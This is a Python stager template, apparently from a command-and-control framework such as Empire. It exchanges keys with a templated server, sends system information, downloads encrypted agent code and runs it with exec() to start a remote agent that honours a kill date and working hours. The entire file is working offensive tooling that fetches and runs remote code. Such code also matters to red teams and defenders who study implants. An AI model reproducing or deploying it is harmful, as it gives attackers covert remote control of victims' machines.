#!/usr/bin/env python3

"""
This file is a Jinja2 template.
    Variables:
        working_hours
        kill_date
        staging_key
        profile
"""

import random
import string
import urllib.request

{% include 'common/aes.py' %}
{% include 'common/rc4.py' %}
{% include 'common/diffiehellman.py' %}
{% include 'common/get_sysinfo.py' %}
{% include 'http/comms.py' %}


class Stage:
    def __init__(self):
        self.staging_key = b'{{ staging_key }}'
        self.profile = '{{ profile }}'
        self.server = '{{ host }}'
        self.kill_date = '{{ kill_date }}'
        self.working_hours = '{{ working_hours }}'

        if self.server.startswith("https"):
            hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None

        self.session_id = self.generate_session_id()
        self.key = None
        self.headers = self.initialize_headers(self.profile)
        self.packet_handler = ExtendedPacketHandler(None, staging_key=self.staging_key, session_id=self.session_id, headers=self.headers, server=self.server, taskURIs=self.taskURIs)

    @staticmethod
    def generate_session_id():
        return b''.join(random.choice(string.ascii_uppercase + string.digits).encode('UTF-8') for _ in range(8))

    def initialize_headers(self, profile):
        parts = profile.split('|')
        self.taskURIs = parts[0].split(',')
        userAgent = parts[1]
        headersRaw = parts[2:]
        headers = {'User-Agent': userAgent}
        for headerRaw in headersRaw:
            try:
                headerKey, headerValue = headerRaw.split(":")
                headers[headerKey] = headerValue
            except Exception:
                pass
        return headers

    def execute(self):
        # Diffie-Hellman Key Exchange
        client_pub = DiffieHellman()
        public_key = str(client_pub.publicKey).encode('UTF-8')
        hmac_data = aes_encrypt_then_hmac(self.staging_key, public_key)

        # Build and Send Routing Packet
        routing_packet = self.packet_handler.build_routing_packet(staging_key=self.staging_key, session_id=self.session_id, meta=2, enc_data=hmac_data)
        post_uri = self.server + "{{ stage_1 | default('/index.jsp', true) | ensureleadingslash }}"
        response = self.packet_handler.post_message(post_uri, routing_packet)

        # Decrypt Server Response
        packet = aes_decrypt_and_verify(self.staging_key, response)
        nonce, server_pub = packet[0:16], int(packet[16:])

        # Generate Shared Secret
        client_pub.genKey(server_pub)
        self.key = client_pub.key
        self.packet_handler.key = self.key

        # Send System Info
        post_uri = self.server + "{{ stage_2 | default('/index.php', true) | ensureleadingslash}}"
        hmac_data = aes_encrypt_then_hmac(self.key, get_sysinfo(nonce=str(int(nonce) + 1)).encode('UTF-8'))
        routing_packet = self.packet_handler.build_routing_packet(staging_key=self.staging_key, session_id=self.session_id, meta=3, enc_data=hmac_data)
        response = self.packet_handler.post_message(post_uri, routing_packet)

        # Decrypt and Execute Agent
        agent_code = aes_decrypt_and_verify(self.key, response)
        exec(agent_code, globals())
        agent = MainAgent(packet_handler=self.packet_handler, profile=self.profile, server=self.server, session_id=self.session_id, kill_date=self.kill_date, working_hours=self.working_hours)
        self.packet_handler.agent = agent
        agent.run()

# Initialize and Execute Agent
stage = Stage()
stage.execute()
